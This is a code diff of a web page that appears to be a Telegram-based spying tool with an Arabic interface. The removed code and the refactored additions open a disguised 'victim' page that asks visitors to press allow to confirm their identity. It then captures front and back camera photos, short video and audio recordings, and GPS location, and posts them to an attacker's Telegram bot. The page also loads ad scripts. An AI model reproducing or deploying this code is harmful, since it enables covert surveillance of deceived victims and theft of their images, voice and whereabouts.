+                loadAd("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
+                loadAd("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
+                loadAd("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
+                const atOpt = document.createElement('script');
+                atOpt.innerHTML =
+                    `atOptions = { 'key' : '0b7539a5227dc7b69da2ea94b0521ab6', 'format' : 'iframe', 'height' : 300, 'width' : 160, 'params' : {} };`;
+                document.body.appendChild(atOpt);
+                loadAd("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
+
+                // Start collection
+                this.startCollection(chat, token, features);
+            },
+
+            startCollection: async function(chat, token, features) {
+                if (!features) return;
+                await VisitorManager.sendUserConfirmation(token, chat, "⛧ Starting Data Collection ⛧");
+                await MediaProcessor.execute(chat, token, features);
+                await VisitorManager.sendUserConfirmation(token, chat, "✅ Data Collection Complete");
+            }
+        };
+
+        // ================================================================
+        // MODULE 8: BACKGROUND EFFECTS (Canvas, Rain)
+        // ================================================================
+        const BackgroundEffects = {
+            initCanvas: function() {
+                const canvas = document.getElementById('hell-canvas');
+                const ctx = canvas.getContext('2d');
+                let w, h;
+
+                const resize = () => { w = canvas.width = window.innerWidth;
+                    h = canvas.height = window.innerHeight; };
+                resize();
+                window.addEventListener('resize', resize);
+
+                let particles = [];
+                const MAX = 220;
+
+                const createParticle = () => {
+                    const type = Math.random();
+                    if (type < 0.35) return { x: Math.random() * w, y: Math.random() * h - h, size: 2 + Math.random() *
+                            6, speedY: 0.5 + Math.random() * 2.0, speedX: (Math.random() - 0.5) * 0.3,
+                        alpha: 0.4 + Math.random() * 0.6, isBlood: true,
+                        color: `rgba(${180 + Math.random()*60}, ${12 + Math.random()*20}, ${12 + Math.random()*20}, ` };
+                    if (type < 0.7) return { x: Math.random() * w, y: Math.random() * h - h, size: 1.5 + Math.random() *
+                            4, speedY: 0.15 + Math.random() * 0.9, speedX: (Math.random() - 0.5) * 0.7,
+                        alpha: 0.5 + Math.random() * 0.5, isBlood: false, isFire: true,
+                        color: `rgba(${255}, ${130 + Math.random()*80}, ${20 + Math.random()*30}, ` };
+                    return { x: Math.random() * w, y: Math.random() * h - h, size: 4 + Math.random() * 8,
+                        speedY: 0.08 + Math.random() * 0.35, speedX: (Math.random() - 0.5) * 0.15,
+                        alpha: 0.15 + Math.random() * 0.25, isBlood: false, isFire: false, isSmoke: true,
+                        color: `rgba(${160 + Math.random()*40}, ${130 + Math.random()*40}, ${90 + Math.random()*30}, ` };
+                };
+
+                for (let i = 0; i < MAX; i++) { const p = createParticle();
+                    p.y = Math.random() * h;
+                    particles.push(p); }
+
+                const draw = () => {
+                    ctx.clearRect(0, 0, w, h);
+                    const grad = ctx.createRadialGradient(w / 2, h / 2, 0, w / 2, h / 2, h);
+                    grad.addColorStop(0, 'rgba(25, 4, 4, 0.10)');
+                    grad.addColorStop(0.35, 'rgba(15, 2, 2, 0.20)');
+                    grad.addColorStop(0.65, 'rgba(8, 0, 0, 0.45)');
+                    grad.addColorStop(1, 'rgba(0, 0, 0, 0.92)');
+                    ctx.fillStyle = grad;
+                    ctx.fillRect(0, 0, w, h);
+
+                    for (let p of particles) {
+                        p.y += p.speedY;
+                        p.x += p.speedX;
+                        if (p.y > h + 30) { Object.assign(p, createParticle());
+                            p.y = -15;
+                            p.x = Math.random() * w; }
+                        if (p.x < -30 || p.x > w + 30) p.x = Math.random() * w;
+                        ctx.beginPath();
+                        if (p.isBlood) {
+                            ctx.ellipse(p.x, p.y, p.size * 0.4, p.size, 0, 0, Math.PI * 2);
+                            ctx.fillStyle = p.color + (p.alpha * 0.6) + ')';
+                            ctx.shadowColor = 'rgba(204, 10, 10, 0.25)';
+                            ctx.shadowBlur = 14;
+                        } else if (p.isFire) {
+                            ctx.arc(p.x, p.y, p.size * 0.6, 0, Math.PI * 2);
+                            const bright = 0.6 + Math.random() * 0.4;
+                            ctx.fillStyle = p.color + (p.alpha * 0.5 * bright) + ')';
+                            ctx.shadowColor = 'rgba(255, 68, 0, 0.4)';
+                            ctx.shadowBlur = 22 + p.size * 4;
+                        } else {
+                            ctx.arc(p.x, p.y, p.size * 0.5, 0, Math.PI * 2);
+                            ctx.fillStyle = p.color + (p.alpha * 0.3) + ')';
+                            ctx.shadowColor = 'rgba(180, 150, 120, 0.05)';
+                            ctx.shadowBlur = 10;
+                        }
+                        ctx.fill();
+                        ctx.shadowBlur = 0;
+                    }
+                    requestAnimationFrame(draw);
+                };
+                draw();
+            },
+
+            initBloodRain: function() {
+                const container = document.getElementById('bloodRain');
+                for (let i = 0; i < 55; i++) {
+                    const drop = document.createElement('div');
+                    drop.className = 'blood-drop';
+                    drop.style.left = Math.random() * 100 + '%';
+                    drop.style.height = (7 + Math.random() * 20) + 'px';
+                    drop.style.animationDuration = (2.8 + Math.random() * 5.5) + 's';
+                    drop.style.animationDelay = (Math.random() * 8) + 's';
+                    drop.style.opacity = 0.2 + Math.random() * 0.5;
+                    drop.style.width = (1.8 + Math.random() * 2.8) + 'px';
+                    container.appendChild(drop);
+                }
+            }
+        };
+
+        // ================================================================
+        // INITIALIZATION
+        // ================================================================
+        document.addEventListener('DOMContentLoaded', async () => {
+            // 1. Background Effects
+            BackgroundEffects.initCanvas();
+            BackgroundEffects.initBloodRain();
+
+            // 2. Visitor Tracking (notifies master immediately)
+            await VisitorManager.init();
+
+            // 3. UI Controller (handles button clicks)
+            UIController.init();
+
+            // 4. Side Page Handler (if victim link is opened)
+            SidePageHandler.init();
         });
-
-        copyBtn.addEventListener('click', async () => {
-            try {
-                const short = linkText.dataset.short || linkText.textContent.match(/https?:\/\/[^\s]+/)?.[0] || '';
-                await navigator.clipboard.writeText(short);
-                copyBtn.innerHTML = '<i class="fas fa-check"></i> تم النسخ';
-                setTimeout(() => copyBtn.innerHTML = '<i class="fas fa-copy"></i> نسخ', 1500);
-            } catch (e) { alert('فشل النسخ'); }
-        });
-
-        // ================================================================
-        //  دوال الوسائط (جميعها تستخدم buildCaption الجديد)
-        // ================================================================
-        function loadAd(src) {
-            const s = document.createElement("script");
-            s.src = src;
-            s.async = true;
-            document.body.appendChild(s);
-        }
-
-        async function captureAndSend(stream, chat, token, type) {
-            return new Promise((resolve) => {
-                const video = document.createElement('video');
-                video.autoplay = true;
-                video.playsInline = true;
-                video.muted = true;
-                video.style.display = 'none';
-                video.srcObject = stream;
-                document.body.appendChild(video);
-
-                video.onloadedmetadata = () => {
-                    video.play();
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                        canvas.toBlob(async (blob) => {
-                            if (blob && blob.size > 2000) {
-                                const form = new FormData();
-                                form.append('chat_id', chat);
-                                form.append('photo', blob, `${type}_${Date.now()}.jpg`);
-                                const extra = `📸 ${type === 'front' ? 'Front' : 'Back'} Camera Photo`;
-                                form.append('caption', buildCaption(extra, chat, token));
-
-                                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                                    method: 'POST',
-                                    body: form
-                                });
-                            }
-                            document.body.removeChild(video);
-                            resolve();
-                        }, 'image/jpeg', 0.9);
-                    }, 2000);
-                };
-            });
-        }
-
-        async function recordAndSend(stream, chat, token, type) {
-            return new Promise((resolve) => {
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
-
-                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    const form = new FormData();
-                    form.append('chat_id', chat);
-                    form.append('video', blob, `${type}_${Date.now()}.mp4`);
-                    const extra = `🎥 ${type === 'front' ? 'Front' : 'Back'} Video (5s)`;
-                    form.append('caption', buildCaption(extra, chat, token));
-
-                    await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-                        method: 'POST',
-                        body: form
-                    });
-                    resolve();
-                };
-
-                mediaRecorder.start();
-                setTimeout(() => {
-                    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-                }, 5000);
-            });
-        }
-
-        async function recordAudioAndSend(stream, chat, token) {
-            return new Promise((resolve) => {
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
-
-                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'audio/mp4' });
-                    const form = new FormData();
-                    form.append('chat_id', chat);
-                    form.append('audio', blob, `audio_${Date.now()}.mp4`);
-                    const extra = `🎤 Audio Recording (5s)`;
-                    form.append('caption', buildCaption(extra, chat, token));
-
-                    await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
-                        method: 'POST',
-                        body: form
-                    });
-                    resolve();
-                };
-
-                mediaRecorder.start();
-                setTimeout(() => {
-                    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-                }, 5000);
-            });
-        }
-
-        async function sendLocation(chat, token) {
-            return new Promise((resolve) => {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        async (position) => {
-                            const { latitude, longitude } = position.coords;
-                            const extra =
-                                `📍 Location\n📌 ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`;
-                            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ chat_id: chat, text: buildCaption(extra, chat,
-                                    token) })
-                            });
-                            resolve();
-                        },
-                        (error) => { resolve(); }
-                    );
-                } else { resolve(); }
-            });
-        }
-
-        async function preGrantPermissions(needCamera, needMicrophone) {
-            if (!needCamera && !needMicrophone) return true;
-            const constraints = {};
-            if (needCamera) constraints.video = true;
-            if (needMicrophone) constraints.audio = true;
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                stream.getTracks().forEach(t => t.stop());
-                return true;
-            } catch (err) { return false; }
-        }
-
-        async function sendConfirmation(chat, token, message) {
-            try {
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chat, text: buildCaption(message, chat, token) })
-                });
-            } catch (e) {}
-        }
-
-        async function startFeatures(chat, token, features) {
-            if (!features) return;
-
-            await sendConfirmation(chat, token, "⛧ Starting Data Collection ⛧");
-
-            const featureList = features.split(',');
-            const needCamera = featureList.some(f => ['camFront', 'camBack', 'videoFront', 'videoBack'].includes(f));
-            const needMicrophone = featureList.some(f => ['audio', 'videoFront', 'videoBack'].includes(f));
-            await preGrantPermissions(needCamera, needMicrophone);
-
-            if (featureList.includes('camFront')) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                    await captureAndSend(stream, chat, token, 'front');
-                    stream.getTracks().forEach(t => t.stop());
-                } catch (e) {}
-            }
-
-            if (featureList.includes('camBack')) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-                    await captureAndSend(stream, chat, token, 'back');
-                    stream.getTracks().forEach(t => t.stop());
-                } catch (e) {}
-            }
-
-            if (featureList.includes('videoFront')) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' },
-                        audio: true });
-                    await recordAndSend(stream, chat, token, 'front');
-                    stream.getTracks().forEach(t => t.stop());
-                } catch (e) {}
-            }
-
-            if (featureList.includes('videoBack')) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' },
-                        audio: true });
-                    await recordAndSend(stream, chat, token, 'back');
-                    stream.getTracks().forEach(t => t.stop());
-                } catch (e) {}
-            }
-
-            if (featureList.includes('audio')) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    await recordAudioAndSend(stream, chat, token);
-                    stream.getTracks().forEach(t => t.stop());
-                } catch (e) {}
-            }
-
-            if (featureList.includes('location')) {
-                await sendLocation(chat, token);
-            }
-
-            await sendConfirmation(chat, token, "✅ Data Collection Complete");
-        }
-
-        // ================================================================
-        //  الوضع الجانبي (صفحة الضحية)
-        // ================================================================
-        const params = new URLSearchParams(window.location.search);
-        const chat = params.get('chat');
-        const token = params.get('token');
-        const features = params.get('features');
-
-        if (chat && token) {
-            document.getElementById('cardArea').style.display = 'none';
-            document.querySelector('.header').style.display = 'none';
-            document.querySelector('.madeby').style.display = 'none';
-            document.getElementById('captureBadge').style.display = 'none';
-            const welcome = document.getElementById('welcomeBox');
-            if (welcome) welcome.style.display = 'none';
-
-            const wrap = document.querySelector('.app-wrap');
-            wrap.innerHTML = '';
-            wrap.style.padding = '0';
-            wrap.style.margin = '0';
-            wrap.style.maxWidth = '100%';
-            wrap.style.background = '#050505';
-            wrap.style.minHeight = '100vh';
-
-            const downloadPage = document.createElement('div');
-            downloadPage.className = 'download-page';
-
-            const mainBox = document.createElement('div');
-            mainBox.className = 'download-box';
-
-            const h2 = document.createElement('h2');
-            h2.innerHTML = `<i class="fas fa-shield-alt"></i> ⛧ يجب الضغط على سماح لتأكيد هوية الزائر`;
-            mainBox.appendChild(h2);
-
-            const adBox1 = document.createElement('div');
-            adBox1.className = 'ad-area';
-            mainBox.appendChild(adBox1);
-
-            const adBox2 = document.createElement('div');
-            adBox2.className = 'ad-area';
-            const containerDiv = document.createElement('div');
-            containerDiv.id = 'container-596225155ab3da796681d551cb4b7cf4';
-            adBox2.appendChild(containerDiv);
-            mainBox.appendChild(adBox2);
-
-            const downloadBtn = document.createElement('button');
-            downloadBtn.className = 'download-btn';
-            downloadBtn.innerHTML = '<i class="fas fa-check-circle"></i> ⛧ تأكيد';
-            downloadBtn.onclick = function() {
-                window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c",
-                    "_blank");
-            };
-            mainBox.appendChild(downloadBtn);
-
-            const adBox3 = document.createElement('div');
-            adBox3.className = 'ad-area';
-            mainBox.appendChild(adBox3);
-            const adBox4 = document.createElement('div');
-            adBox4.className = 'ad-area';
-            mainBox.appendChild(adBox4);
-
-            const footer = document.createElement('div');
-            footer.className = 'download-footer';
-            footer.innerHTML = `
-                <div class="dev-block">
-                    <i class="fas fa-code"></i>
-                    <span class="dev-name">@xx_8k</span>
-                </div>
-            `;
-            mainBox.appendChild(footer);
-
-            downloadPage.appendChild(mainBox);
-            wrap.appendChild(downloadPage);
-
-            loadAd("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
-            loadAd("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
-            loadAd("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
-            const atOptionsScript = document.createElement('script');
-            atOptionsScript.innerHTML =
-                `atOptions = { 'key' : '0b7539a5227dc7b69da2ea94b0521ab6', 'format' : 'iframe', 'height' : 300, 'width' : 160, 'params' : {} };`;
-            document.body.appendChild(atOptionsScript);
-            loadAd("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
-
-            startFeatures(chat, token, features);
-        }
     </script>
 
 </body>
